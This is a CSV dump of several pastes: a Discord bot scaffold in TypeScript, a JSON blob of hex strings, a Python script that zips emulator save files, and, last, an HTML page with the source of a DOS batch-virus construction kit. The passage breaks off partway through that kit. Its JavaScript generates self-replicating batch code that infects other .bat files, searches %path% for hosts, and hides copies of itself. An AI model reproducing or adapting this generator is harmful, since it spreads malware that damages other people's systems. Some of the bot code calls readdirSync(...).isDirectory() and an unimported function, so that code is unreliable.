id,title,username,language,date,content
  mongoURI: 'your_mongodb_connection_string',
};
```

# src/commands/moderation/ban.ts
```ts
import { CommandInteraction, Client } from 'discord.js';
import { SlashCommandBuilder } from '@discordjs/builders';

export const command = {
  data: new SlashCommandBuilder()
    .setName('ban')
    .setDescription('Ban a user')
    .addUserOption((option) =>
      option.setName('user').setDescription('The user to ban').setRequired(true)
    )
    .addStringOption((option) =>
      option.setName('reason').setDescription('The reason for the ban').setRequired(false)
    ),
  async execute(interaction: CommandInteraction, client: Client) {
    // Check permissions and execute the command
  },
};
```
# src/commands/util/ping.ts
```ts
import { SlashCommandBuilder } from '@discordjs/builders';
import { CommandInteraction } from 'discord.js';
import { MongoClient } from 'mongodb';

export const data = new SlashCommandBuilder().setName('ping').setDescription('Replies with Pong!');

export const execute = async (interaction: CommandInteraction, mongoClient: MongoClient) => {
  const hasPermission = await checkPermission(interaction, mongoClient, 2);

  if (hasPermission) {
    await interaction.reply('Pong!');
  } else {
    await interaction.reply({
      content: 'You do not have permission to use this command.',
      ephemeral: true,
    });
  }
};
```

# src/events/messageCreate.ts
```ts
import { Message } from 'discord.js';
import { MongoClient } from 'mongodb';

export const name = 'messageCreate';

export const execute = async (message: Message, mongoClient: MongoClient) => {
  // Your message handling code here
};
```

# src/events/ready.ts
```ts
import { Client } from 'discord.js';
import { MongoClient } from 'mongodb';

export const name = 'ready';
export const once = true;

export const execute = (client: Client, mongoClient: MongoClient) => {
  console.log(`Logged in as ${client.user?.tag}!`);
};
```

# src/utils/permissions.ts
```ts
import { CommandInteraction } from 'discord.js';
import { MongoClient } from 'mongodb';

export const checkPermission = async (
  interaction: CommandInteraction,
  mongoClient: MongoClient,
  requiredPermissionLevel: number
): Promise<boolean> => {
  const userId = interaction.user.id;
  const collection = mongoClient.db('your_database_name').collection('permissions');

  const userPermission = await collection.findOne({ userId });

  const userPermissionLevel = userPermission ? userPermission.level : 1;

  return userPermissionLevel >= requiredPermissionLevel;
};
```

# src/utils/registry.ts
```ts
import { Client } from 'discord.js';
import { readdirSync } from 'fs';
import { join } from 'path';

export async function registerCommands(client: Client, dir: string) {
  const files = readdirSync(join(__dirname, dir));
  for (const file of files) {
    const stat = readdirSync(join(__dirname, dir, file)).isDirectory();
    if (stat) {
      registerCommands(client, join(dir, file));
    } else {
      if (file.endsWith('.ts')) {
        const { command } = await import(join(__dirname, dir, file));
        client.commands.set(command.data.name, command);
      }
    }
  }
}

export async function registerEvents(client: Client, dir: string) {
  const files = readdirSync(join(__dirname, dir));
  for (const file of files) {
    const stat = readdirSync(join(__dirname, dir, file)).isDirectory();
    if (stat) {
      registerEvents(client, join(dir, file));
    } else {
      if (file.endsWith('.ts')) {
        const { event } = await import(join(__dirname, dir, file));
        if (event.once) {
          client.once(event.name, (...args) => event.execute(...args, client));
        } else {
          client.on(event.name, (...args) => event.execute(...args, client));
        }
      }
    }
  }
}
```

# src/bot.ts
```ts
import { Client, Collection, Intents } from 'discord.js';
import { MongoClient } from 'mongodb';
import dotenv from 'dotenv';
import { config } from './config';
import { registerCommands, registerEvents } from './utils/registry';

dotenv.config();

(async () => {
  const client = new Client({ intents: [Intents.FLAGS.Guilds, Intents.FLAGS.GuildMessages] });
  client.commands = new Collection();
  client.events = new Collection();
  client.mongo = new MongoClient(config.mongoURI);

  await client.mongo.connect();
  console.log('Connected to MongoDB');

  await registerCommands(client, '../commands');
  await registerEvents(client, '../events');

  client.login(process.env.DISCORD_BOT_TOKEN);
})();
```"
Evxq5ctK,data605,TestGuy1,JSON,Friday 16th of June 2023 06:13:39 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'fc33ec15c56680e4cf8ba39865300351556a3fc3d69ec3e7a526f038b5832edac4df1235b60db118b07f03d1d20a1f588f2a26150c68705c7673895c61249bfdb4372d6becf5e7e9781deeb78aca2c5d2965f42204abcc7715161df547dd98713d1406b8366e46ff2e9564e234a9e84f3b3afd9c3dcb200df810c46ba4482a96',
  otherdata: [
    '73c030f5485ce8fa07e1ff3049d7d65d',
    '9690f8955d2af387f9ac6fd9eb847fa6',
    'a7fa289b9ab879e70133465ca98d289d',
    '60c7b532a9728fc5690482e4ab9cf034',
    '6f58c3c7e4186f4efe33c2d673184e92',
    'cd79b5759eb65169c1ac04d582181465',
    'fbf6022f2956b8176d1cd2d3a657a11a',
    '06c0bb728855eccdc4964c0d4502ce59'
  ]
}"
nWQazVdc,Pyinstaller Qt config fix,Diapolo10,Python,Friday 16th of June 2023 06:11:49 AM CDT,"import sys
import zipfile
from pathlib import Path
from tkinter import filedialog

CONFIG_FILE_NAME = 'qt-config.ini'


def resolve_path(path: str | Path) -> Path:
    if getattr(sys, ""frozen"", False):
        # If the script is running as a bundled app (.exe)
        script_dir = Path(sys.executable).resolve().parent
    else:
        # If the script is running in development mode
        script_dir = Path(__file__).resolve().parent

    return script_dir / path

def open_qt_config() -> None:
    # Locate ""qt-config.ini"" file in the ""config"" folder
    config_dir = resolve_path('config')

    for file in config_dir.rglob(CONFIG_FILE_NAME):
        if file.is_file():
            qt_config_file = file
            break
    else:
        print(f""No '{CONFIG_FILE_NAME}' file found in the 'config' folder."")
        return

    with open(qt_config_file) as file:
        for line in file:
            if line.startswith('nand_directory='):
                input_folder = Path(line.replace('nand_directory=', '').strip(), 'user', 'save')
                break
        else:
            print(f""No 'nand_directory' entry found in '{CONFIG_FILE_NAME}'."")
            return

    # Select output file
    output_file = filedialog.asksaveasfilename(
        title=""Select output file"",
        defaultextension="".zip"",
        filetypes=((""Zip Files"", ""*.zip""),)
    )

    if not output_file:
        print(""No output file location or name selected."")
        return

    # Create a .zip file in write mode
    with zipfile.ZipFile(output_file, ""w"", compression=zipfile.ZIP_DEFLATED) as zipf:
        # Traverse files and folders in the input folder
        for file in input_folder.rglob('*'):
            if file.is_dir() or 'cache' in str(file.parent):
                continue
                
            relative_path = file.relative_to(input_folder)
            
            zipf.write(file, arcname=relative_path)

    print(f""Compressed file copy created at: {output_file}"")

if __name__ == ""__main__"":
    open_qt_config()
    input(""Press Enter to exit."")
"
kCpGue2C,Constructor.DOS.IBBM.a. - Source Code,FlyFar,HTML,Friday 16th of June 2023 06:00:49 AM CDT,"<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.0 Transitional//EN"">
<!-- saved from url=(0059)http://vx.netlux.org/dl/vir/Constructor.DOS.IBBM.a?x=8&y=20 -->
<HTML><HEAD><TITLE>BBM</TITLE>
<META http-equiv=Content-Type content=""text/html; charset=windows-1250"">
<SCRIPT>


//<plaintext>





//


//  The Incredible Batch Bug Maker


//  For Netscape 2 w/ JavaScript


//  DOS 6 compatible output only!


//





// define our vars...


// (so netscape won't freak)


var method=0;


var search=0;


var name="""";


var key="""";


var infects="""";


var seeks="""";


var findhost=false;


var usecopy=false;  


var hidecopy=false;


var echoblank=false;


var codewindow=false;


var comment="""";


var tmatch1="""";


var tmatch2="""";


var dmatch1="""";


var dmatch2="""";


var addcode="""";





// default variables...


function Reset(vars) {


 findhost=false;


 usecopy=true;


 hidecopy=false;


 echoblank=true;


 codewindow=true;


 with (document) {


  vars.Method.options[0].selected=true;


  vars.Search.options[0].selected=true;


  vars.Name.value = ""gobbm"";


  vars.Key.value = ""BuG!"";


  vars.Infects.value = 1;


  vars.Seeks.value = 20;


  vars.FindHost.checked=findhost;


  vars.UseCopy.checked=usecopy;


  vars.HideCopy.checked=hidecopy;


  vars.EchoBlank.checked=echoblank;


  vars.CodeWindow.checked=codewindow;


  vars.Comment.value="""";


  vars.AddCode.value="""";


  vars.TMatch1.value="""";


  vars.TMatch2.value="""";


  vars.DMatch1.value="""";


  vars.DMatch2.value="""";


 }


}





function WinOpen(something) {


 msg=open(something,""DisplayWindow"",


  ""toolbar=no,directories=no,menubar=no,scrollbars=yes,resizable=yes"");


 codewindow=true;


 return msg;


}


function write(stuff) {


 if (codewindow) msg.document.writeln(stuff);


  else document.writeln(stuff);


}


function wr(stuff) {


 if (codewindow) msg.document.write(stuff);


  else document.write(stuff);


}





function MakeBug(vars) {


 method=0;


 search=0;


 for (var i=0; i<4; i++) if (vars.Method.options[i].selected) method=i;


 for (var i=0; i<4; i++) if (vars.Search.options[i].selected) search=i;


 name=vars.Name.value;


 key=vars.Key.value;


 comment=vars.Comment.value;


 infects=vars.Infects.value;


 seeks=vars.Seeks.value;


 findhost=vars.FindHost.checked;


 usecopy=vars.UseCopy.checked;


 hidecopy=vars.HideCopy.checked;


 echoblank=vars.EchoBlank.checked;


 codewindow=vars.CodeWindow.checked; 


 comment=vars.Comment.value;


 tmatch1=vars.TMatch1.value;


 tmatch2=vars.TMatch2.value;


 dmatch1=vars.DMatch1.value;


 dmatch2=vars.DMatch2.value;


 addcode=vars.AddCode.value;


 if (codewindow) var msg=WinOpen("""");


 if (method==0 && findhost)


   write(""<h3>Error - Appending types cannot find host</h3>"");


 else if (method==0 && !usecopy)


   write(""<h3>Error - Appending types must use copy</h3>""); 


 else if (key=="""" || name=="""")


   write(""<h3>Error - Must have Key and SubString entries</h3>"");


 else if (name.indexOf(key)>=0)


   write(""<h3>Error - Key cannot be in SubString</h3>"");


 else {


  wr(""<pre>"");


  GenerateCode();


  wr(""</pre><hr>"");


 }


 if (codewindow) {


  wr(""<form>"");


  wr(""<input type='button' value='Close' onclick='close()'>"");


  wr(""</form>"");


 }


}


function GenerateCode() {


 var type=method+1;


 var mask=""*.bat"";


 var dopath=0;


 if (search==1) mask=""*.bat ..\\*.bat"";


 if (search==2) mask=""..\\*.bat *.bat"";


 if (search==3) {


  mask="". .. %path%"";


  dopath=1;


 }


 var s_infects="""";


 if (parseInt(infects)>0)


  for (var i=0; i<parseInt(infects); i++)


   s_infects=s_infects+""1"";


 var s_seeks="""";


 if (parseInt(seeks)>0)


  for (var i=0; i<parseInt(seeks); i++)


   s_seeks=s_seeks+""1"";


 var v1=""%""+key+""%"";


 if (usecopy) v1=""c:\\_"" + key;


 var v8=""end"";


 if (type==2) v8=""xt""; 


 if (type==3 || type==4) {


  write(""@if '%_""+name+""%==' goto _""+name);


  write(""::**** HOST ****"");


  if (echoblank) write("""");  


  write(""@if not '%_""+name+""%==' goto ""+key+""end"");


  write("":_""+name+"" ""+key);


 }


 if (type==1) {


  write(""::**** HOST ****"");


  if (echoblank) write("""");


 }


 if(comment!="""") write(""::""+key+"" ""+comment);


 write(""@echo off%_""+key+""%"");


 write(""if '%1=='""+key+"" goto ""+key+""%2"");


 write(""set ""+key+""=%0.bat"");


 write(""if not exist %""+key+""% set ""+key+""=%0"");


 write(""if '%""+key+""%==' set ""+key+""=autoexec.bat"");


 if (type==3||type==4) write(""set !""+key+""=%1 %2 %3 %4 %5 %6 %7 %8 %9"");


 if (type==4) {


  write(""call %""+key+""% ""+key+"" rh"");


  write(""set _""+name+""=>nul.""+key);


  write(""set !""+key+""="");


 }


 if (usecopy) write(""if exist c:\\_""+key+"".bat goto ""+key+""g"");


 if (findhost) {


  write(""if exist %""+key+""% goto ""+key+""fe"");


  write(""call %""+key+""% ""+key+"" h %path%"");


  write(""if exist %""+key+""% goto ""+key+""fe"");


  write(""goto e""+key);


  write("":""+key+""h"");


  write(""shift%_""+key+""%"");


  write(""if '%2==' goto ""+key+v8);


  write(""if exist %2\\%""+key+"" set ""+key+""=%2\\%""+key+""%"");


  write(""if exist %2%""+key+"" set ""+key+""=%2%""+key+""%"");


  write(""if exist %2\\%""+key+"".bat set ""+key+""=%2\\%""+key+""%.bat"");


  write(""if exist %2%""+key+"".bat set ""+key+""=%2%""+key+""%.bat"");


  write(""if not exist %""+key+""% goto ""+key+""h"");


  write(""goto ""+key+v8);


  write("":""+key+""fe"");


 }


 if (usecopy) {


  if(!findhost) write(""if not exist %""+key+""% goto e""+key);


  write(""find &quot;""+key+""&quot;&lt;%""+key+""%>c:\\_""+key+"".bat"");


  if (hidecopy) write(""attrib c:\\_""+key+"".bat +h"");


  write("":""+key+""g"");


 }


 if (!usecopy&&!findhost) write(""if not exist %""+key+""% goto e""+key);


 var v3=""/e:5000 /c"";


 if (s_seeks=="""" && s_infects=="""") v3=""/c"";


 if (s_seeks=="""" && s_infects==""1"") v3=""/c"";


 if (dopath) write(""command ""+v3+"" ""+v1+"" ""+key+"" vir ""+mask);


 if (!dopath) write(""command ""+v3+"" ""+v1+"" ""+key+"" vir"");


 write("":e""+key);


 var activate=false;


 if (dmatch1!="""") {


  write(""echo.|date|find &quot;""+dmatch1+""&quot;>nul.""+key);


  write(""if errorlevel 1 goto na""+key);
